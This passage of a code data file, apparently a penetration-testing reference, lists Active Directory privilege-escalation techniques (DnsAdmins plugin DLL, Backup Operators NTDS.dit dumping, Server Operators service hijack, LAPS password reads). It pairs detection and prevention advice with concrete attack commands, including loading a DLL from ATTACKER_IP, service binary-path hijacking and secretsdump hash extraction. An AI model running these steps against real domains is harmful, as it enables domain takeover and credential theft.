    likelihood: 'Rare',
    description:
      'Members of the built-in DnsAdmins group are granted administrative control over the Microsoft DNS Server service, which on most Active ' +
      'Directory environments runs directly on domain controllers as part of the integrated DNS role. The DNS Server service supports loading custom ' +
      'plugin DLLs to extend its functionality, and a DnsAdmins member can configure the service to load an arbitrary DLL from a UNC path using the ' +
      'dnscmd /config /serverlevelplugindll option. Because the DNS Server service on a domain controller runs as SYSTEM (or in some configurations, as ' +
      'the Network Service or Local Service account, though still domain-controller-privileged), causing it to load a malicious DLL and then restarting ' +
      'the service (which DnsAdmins members, or in some environments the ability to trigger via other means, can do) executes the attacker\'s code with ' +
      'that elevated privilege directly on the domain controller, converting DnsAdmins membership -- a group often granted more casually than its actual ' +
      'impact warrants -- into a direct path to full domain compromise.',
    enumeration_commands: [
      { command: 'net group "DnsAdmins" /domain', description: 'Enumerate current membership of the DnsAdmins group.', what_to_look_for: 'Confirmation of your own account\'s (or a compromised account\'s) membership.' },
      { command: 'Get-ADGroupMember -Identity DnsAdmins', description: 'PowerShell/AD module equivalent for enumerating DnsAdmins membership.', what_to_look_for: 'Same as above, plus cross-referencing with BloodHound for a full attack path visualization.' },
      { command: 'dnscmd DC01 /info', description: 'Query the DNS server configuration on a target domain controller to confirm the service is reachable and manageable.', what_to_look_for: 'Successful response confirming administrative reach to the DNS service.' }
    ],
    exploitation_steps: [
      'Confirm DnsAdmins group membership for the current or a compromised account.',
      'Build a malicious DLL exposing the required DnsPluginInitialize export expected by the DNS server plugin interface, with a payload that executes upon load (e.g. adding a new domain administrator account, or spawning a reverse shell).',
      'Host the malicious DLL on an accessible SMB share (attacker-controlled or an existing writable share) reachable by the domain controller via UNC path.',
      'Configure the DNS server to load the malicious plugin: dnscmd DC01 /config /serverlevelplugindll \\\\ATTACKER_IP\\share\\evil.dll.',
      'Restart the DNS service to trigger the plugin load: sc \\\\DC01 stop dns followed by sc \\\\DC01 start dns (DnsAdmins membership typically grants the required service control rights, or this can be triggered via other available service-restart primitives).',
      'The DNS service loads and executes the malicious DLL with its elevated service privileges directly on the domain controller.',
      'Confirm the resulting payload effect (new domain admin account, or a caught reverse shell running as SYSTEM on the DC) and use it to complete full domain compromise.',
      'Revert the serverlevelplugindll configuration and restore the DNS service after demonstrating impact if required by the engagement scope.'
    ],
    tools: ['dnscmd.exe', 'Custom DNS plugin DLL (DnsPluginInitialize export)', 'PowerView', 'BloodHound', 'Mimikatz'],
    detection:
      'Windows Event Log monitoring for DNS server configuration changes (Event ID 150 in the DNS Server event log for plugin DLL configuration), ' +
      'combined with Security Event Log monitoring for DNS service restarts and DnsAdmins group membership changes, provides comprehensive detection ' +
      'coverage for this technique.',
    prevention:
      'Restrict DnsAdmins group membership to only accounts that specifically require DNS administrative rights, recognizing that this group is ' +
      'functionally equivalent to domain controller SYSTEM access; consider running DNS service under a more restrictive configuration where feasible, ' +
      'and monitor serverlevelplugindll configuration changes as a critical security event.',
    real_world_examples: [
      { reference: 'Public research by Shay Ber (2017/2018)', description: 'This DnsAdmins-to-domain-controller-SYSTEM escalation path was first publicly detailed by security researcher Shay Ber, and remains a standard BloodHound-flagged attack path and a frequent finding in Active Directory security assessments where DnsAdmins membership is granted too broadly.' }
    ]
  },
  {
    id: 'windows-backup-operators-abuse',
    name: 'Backup Operators Group Abuse (Domain Controller Compromise)',
    category: 'Active Directory Abuse',
    difficulty: 'Medium',
    likelihood: 'Rare',
    description:
      'The built-in Backup Operators group grants members SeBackupPrivilege and SeRestorePrivilege on the systems where the group applies, and when ' +
      'granted on a domain controller (either directly or via a group nested into the DC-local Backup Operators group), this translates directly into ' +
      'the ability to read the NTDS.dit Active Directory database file and the SYSTEM registry hive needed to decrypt it, using the same shadow-copy- ' +
      'based extraction technique described for general SeBackupPrivilege abuse. Because NTDS.dit contains the password hash (and, for accounts with ' +
      'reversible encryption or certain legacy configurations, additional recoverable credential material) for every account in the entire Active ' +
      'Directory domain, Backup Operators membership on a domain controller is functionally equivalent to full domain compromise, even though the ' +
      'group is not itself a member of Domain Admins and is sometimes granted to IT support staff without full appreciation of this equivalence.',
    enumeration_commands: [
      { command: 'net group "Backup Operators" /domain', description: 'Enumerate domain-level Backup Operators group membership.', what_to_look_for: 'Any user or nested group membership, especially service or support-staff accounts.' },
      { command: 'Get-ADGroupMember -Identity "Backup Operators"', description: 'PowerShell/AD module equivalent, useful for correlating with BloodHound attack path data.', what_to_look_for: 'Membership that grants an attacker-controlled or compromised account this group.' }
    ],
    exploitation_steps: [
      'Confirm Backup Operators group membership on the target domain controller for the current or a compromised account.',
      'Enable SeBackupPrivilege in the current token if not already active, using a privilege-enabling PowerShell module.',
      'Use diskshadow.exe to create a Volume Shadow Copy of the domain controller\'s system volume, bypassing the normal in-use file lock on NTDS.dit.',
      'Copy the NTDS.dit file and the SYSTEM registry hive out of the shadow copy to an accessible location.',
      'Transfer both files to an attacker-controlled machine and extract every domain account\'s NTLM hash offline using Impacket\'s secretsdump.py: secretsdump.py -ntds ntds.dit -system system.hive LOCAL.',
      'Use the extracted krbtgt account hash to forge Golden Tickets for persistent, complete domain access, or use any Domain Admin account\'s extracted hash directly for pass-the-hash authentication.',
      'Verify full domain compromise by successfully authenticating to the domain controller or another domain resource using the extracted credentials.'
    ],
    tools: ['SeBackupPrivilegeUtils / SeBackupPrivilegeCmdLets', 'diskshadow.exe', 'Impacket secretsdump.py', 'Mimikatz (lsadump::dcsync as an alternative extraction path)'],
    detection:
      'Security Event Log auditing for SeBackupPrivilege use on a domain controller (Event ID 4673/4674), combined with monitoring for diskshadow.exe ' +
      'execution and any access to NTDS.dit outside of legitimate backup software, are the primary detection controls.',
    prevention:
      'Restrict Backup Operators group membership on domain controllers as tightly as Domain Admins itself, since it is functionally equivalent; use ' +
      'dedicated, monitored backup service accounts rather than granting the privilege to interactive IT staff accounts.',
    real_world_examples: [
      { reference: 'MITRE ATT&CK T1003.003 (OS Credential Dumping: NTDS)', description: 'Backup Operators-enabled NTDS.dit extraction is a well-documented Active Directory privilege escalation path, frequently identified by BloodHound as a direct route to domain compromise whenever the group is populated beyond genuine backup infrastructure accounts.' }
    ]
  },
  {
    id: 'windows-server-operators-abuse',
    name: 'Server Operators Group Abuse',
    category: 'Active Directory Abuse',
    difficulty: 'Medium',
    likelihood: 'Rare',
    description:
      'The built-in Server Operators group, when populated on a domain controller, grants members the ability to log on locally, start and stop ' +
      'services, and modify service configuration on that domain controller, without needing full Domain Admins membership. Combined with the ' +
      'weak-service-permission and unquoted-path techniques described elsewhere in this reference, Server Operators membership provides a direct path ' +
      'to modify any service on the domain controller (since Server Operators can reconfigure service binary paths via the Service Control Manager\'s ' +
      'ChangeServiceConfig API, which the group is explicitly granted rights to call) and trigger it to run as SYSTEM, achieving full domain controller ' +
      'compromise from group membership alone with no additional vulnerability required.',
    enumeration_commands: [
      { command: 'net group "Server Operators" /domain', description: 'Enumerate domain-level Server Operators group membership.', what_to_look_for: 'Any user or nested group membership on this group.' },
      { command: 'sc.exe \\\\DC01 qc SERVICENAME', description: 'From a Server Operators context, confirm the ability to query and later modify service configuration on the target domain controller.', what_to_look_for: 'Successful query response confirming reachability and administrative rights over the target service.' }
    ],
    exploitation_steps: [
      'Confirm Server Operators group membership on the target domain controller.',
      'Identify any existing service on the domain controller that runs as LocalSystem (most built-in Windows services qualify).',
      'Reconfigure the service\'s binary path to point at a malicious payload: sc.exe \\\\DC01 config SERVICENAME binPath= "C:\\Windows\\Temp\\payload.exe".',
      'Start (or restart) the service using Server Operators\' granted service-control rights: sc.exe \\\\DC01 start SERVICENAME.',
      'The service executes the malicious payload as SYSTEM directly on the domain controller.',
      'Catch the resulting reverse shell or confirm the payload\'s effect, achieving full domain controller and domain compromise.',
      'Restore the original service configuration after demonstrating impact if required by the engagement scope.'
    ],
    tools: ['sc.exe', 'PowerView', 'BloodHound', 'msfvenom'],
    detection:
      'Security Event Log service configuration change auditing (Event ID 7040/4697 for service state and installation changes) on domain controllers, ' +
      'combined with monitoring Server Operators group membership for unexpected additions, provides comprehensive detection coverage.',
    prevention:
      'Restrict Server Operators group membership on domain controllers as tightly as Domain Admins itself, given its direct equivalence to SYSTEM-level ' +
      'code execution via service reconfiguration; avoid using this group as a convenience delegation mechanism for routine service management tasks.',
    real_world_examples: [
      { reference: 'BloodHound attack path documentation', description: 'Server Operators-to-domain-controller-compromise is a standard, automatically flagged attack path in BloodHound\'s Active Directory attack graph analysis, reflecting its consistent presence as a finding across real-world domain security assessments.' }
    ]
  },
  {
    id: 'windows-laps-password-reading',
    name: 'LAPS Password Reading (Overly Permissive ms-Mcs-AdmPwd ACL)',
    category: 'Active Directory Abuse',
    difficulty: 'Low',
    likelihood: 'Occasional',
    description:
      'The Local Administrator Password Solution (LAPS) is Microsoft\'s recommended mitigation against static, shared local administrator passwords ' +
      'across a Windows fleet: it randomizes each computer\'s local Administrator password and stores the current value in a confidential Active ' +
      'Directory attribute (ms-Mcs-AdmPwd, or the newer msLAPS-Password for Windows LAPS) on that computer\'s AD computer object, readable only by ' +
      'accounts explicitly delegated read access. If this delegation is misconfigured -- most commonly by granting read access too broadly (an entire ' +
      'OU\'s "Authenticated Users" or a broad IT-support group that includes standard users, rather than a tightly scoped admin group) -- any user with ' +
      'that overly broad read access can query the attribute directly via LDAP and read the plaintext current local administrator password for the ' +
      'target machine, achieving local administrative access without any exploitation at all.',
    enumeration_commands: [
      { command: 'Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where {$_."ms-Mcs-AdmPwd" -ne $null}', description: 'From an authenticated domain context, attempt to read the LAPS password attribute across all computer objects the current account has access to.', what_to_look_for: 'Any computer object returning a non-null password value, confirming both LAPS deployment and overly permissive read access for the current account.' },
      { command: 'Find-LAPSDelegatedGroups / Find-AdmPwdExtendedRights (PowerView / LAPSToolkit)', description: 'Use dedicated LAPS auditing scripts to enumerate exactly which principals have been delegated read access to the LAPS password attribute across the domain.', what_to_look_for: 'Broad groups (Domain Users, Authenticated Users, or an overly inclusive IT group) granted ExtendedRight or ReadProperty on ms-Mcs-AdmPwd.' }
    ],
    exploitation_steps: [
      'Enumerate LAPS attribute read delegation across the domain using LAPSToolkit\'s Find-LAPSDelegatedGroups or an equivalent ACL enumeration approach, or via BloodHound\'s LAPS-aware edges.',
      'Identify any computer object where your current account (directly or via group membership) has read access to ms-Mcs-AdmPwd due to an overly broad delegation.',
      'Query the attribute directly: Get-ADComputer TARGETCOMPUTER -Properties ms-Mcs-AdmPwd | select ms-Mcs-AdmPwd, or via a raw LDAP query if the AD PowerShell module is unavailable.',
      'Use the retrieved plaintext local Administrator password to authenticate directly to the target computer (via RDP, WinRM, PsExec, or SMB) as the local administrator account.',
      'If the target computer is high-value (a server, a jump box, or a machine where a domain administrator regularly logs on), use this local admin access to extract cached domain credentials or pivot further, potentially escalating to full domain compromise.',
      'Verify final access level and document the exact over-delegated group or account that enabled the read access.'
    ],
    tools: ['LAPSToolkit', 'PowerView', 'BloodHound (LAPS-aware collection)', 'ActiveDirectory PowerShell module'],
    detection:
      'Directory Service auditing (Event ID 4662 for object access, filtered on the ms-Mcs-AdmPwd/msLAPS-Password attribute GUID) reveals every read of ' +
      'the LAPS password attribute; correlating reads against the expected, tightly scoped delegation list flags unauthorized access attempts.',
    prevention:
      'Delegate LAPS password read access using the principle of least privilege, scoped to the smallest practical group of genuinely authorized ' +
      'administrators per OU, regularly audit delegation using LAPSToolkit or equivalent tooling, and migrate to Windows LAPS (built into modern Windows ' +
      'releases) which offers improved auditing and encryption options over the original legacy LAPS solution.',
    real_world_examples: [
      { reference: 'CWE-284 Improper Access Control', description: 'Over-permissioned LAPS attribute delegation is a routine finding in Active Directory security assessments, and BloodHound explicitly models and flags LAPS-readable relationships as part of its standard attack path analysis given how directly it converts into local admin access.' }
    ]
  },
];
